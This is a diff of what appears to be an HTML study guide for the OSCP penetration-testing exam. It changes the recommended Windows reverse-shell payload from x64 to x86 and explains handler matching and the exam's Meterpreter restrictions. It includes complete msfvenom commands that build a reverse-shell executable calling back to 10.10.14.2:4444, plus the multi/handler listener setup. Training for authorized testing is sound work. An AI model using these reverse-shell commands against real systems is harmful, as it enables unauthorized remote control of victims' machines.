@@ -200,19 +200,20 @@ Meterpreter itself remains limited to the one selected target.
 <h3>msfvenom -p, normal shell vs Meterpreter — OSCP decision and handler matching</h3>
 <p><strong>Important:</strong> <code>-p</code> in <code>msfvenom</code> means <strong>payload</strong>, not Meterpreter. <code>-f exe</code> selects the executable output format; <code>-o shell.exe</code> selects the output file. Generating an EXE does <strong>not</strong> launch a listener or open a session. <code>msfconsole -q</code> merely starts the console quietly (without the banner).</p>
 <p><strong>Default OSCP choice:</strong> use a normal command shell for manual enumeration, evidence collection and privilege escalation. Meterpreter provides Metasploit features such as built-in upload/download, process interactions and compatible post modules, but is <strong>restricted to one selected exam target machine</strong>. The rule is about <em>one machine, not one session</em>: multiple uses/sessions on that same machine are allowed. A failed restricted attempt still locks your one-machine choice; never try Meterpreter or Metasploit Auxiliary/Exploit/Post on a second machine.</p>
-<table><thead><tr><th>Windows x64 payload name</th><th>Session / staging</th><th>OSCP guidance</th></tr></thead><tbody>
-<tr><td><code>windows/x64/shell_reverse_tcp</code></td><td>Normal command shell, stageless</td><td>Default manual shell; permitted with <code>msfvenom</code> + <code>multi/handler</code> across targets</td></tr>
+<table><thead><tr><th>Windows command-shell payload</th><th>Session / staging</th><th>OSCP guidance</th></tr></thead><tbody>
+<tr><td><code>windows/shell_reverse_tcp</code></td><td>Normal command shell, stageless</td><td><strong>Preferred default</strong>; use first for ordinary Windows reverse shells</td></tr>
+<tr><td><code>windows/x64/shell_reverse_tcp</code></td><td>Normal x64 command shell, stageless</td><td>Architecture-specific alternative when explicitly required</td></tr>
 <tr><td><code>windows/x64/shell/reverse_tcp</code></td><td>Normal command shell, staged</td><td>Match this exact staged name in the handler</td></tr>
 <tr><td><code>windows/x64/meterpreter/reverse_tcp</code></td><td>Meterpreter, staged</td><td><strong>Only on the one selected target</strong></td></tr>
 <tr><td><code>windows/x64/meterpreter_reverse_tcp</code></td><td>Meterpreter, stageless</td><td><strong>Only on the one selected target</strong></td></tr>
 </tbody></table>
 <h4>Recommended: normal shell (no Meterpreter; authorized lab or permitted exam targets)</h4>
 <pre class="ref-code" data-copy-plain="true"><code class="language-bash"># Kali terminal: replace LHOST with your reachable tun0/VPN callback IP.
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f exe -o shell.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f exe -o shell.exe
 # In another terminal: msfconsole -q
 # Inside msfconsole:
 use exploit/multi/handler
-set PAYLOAD windows/x64/shell_reverse_tcp
+set PAYLOAD windows/shell_reverse_tcp
 set LHOST 10.10.14.2
 set LPORT 4444
 set ExitOnSession false
@@ -231,7 +232,7 @@ set ExitOnSession false
 run -j
 jobs -l
 sessions -l</code></pre>
-<p><strong>Payload matching is mandatory:</strong> a file built as <code>windows/x64/meterpreter/reverse_tcp</code> must <strong>not</strong> use a <code>windows/x64/shell_reverse_tcp</code> handler. Also match the architecture, staged/stageless name, <code>LHOST</code> and <code>LPORT</code>. Do not expect a Meterpreter callback to work with <code>nc</code> or a normal-shell handler.</p>
+<p><strong>Architecture note:</strong> prefer <code>windows/shell_reverse_tcp</code> as the general Windows command-shell payload. It is the x86 payload and can run on 64-bit Windows under WOW64 when the target permits it. Use <code>windows/x64/shell_reverse_tcp</code> only when you specifically need an x64 payload. The handler must match the generated payload exactly. <strong>Payload matching is mandatory:</strong> a file built as <code>windows/x64/meterpreter/reverse_tcp</code> must <strong>not</strong> use a <code>windows/shell_reverse_tcp</code> handler. Also match the architecture, staged/stageless name, <code>LHOST</code> and <code>LPORT</code>. Do not expect a Meterpreter callback to work with <code>nc</code> or a normal-shell handler.</p>
 <h4>No session / session opens then immediately closes — fast checks</h4>
 <pre class="ref-code" data-copy-plain="true"><code class="language-text">1. msfvenom only CREATES a payload file; it does not execute it.
 2. Handler PAYLOAD must equal the msfvenom -p payload (including / versus _).
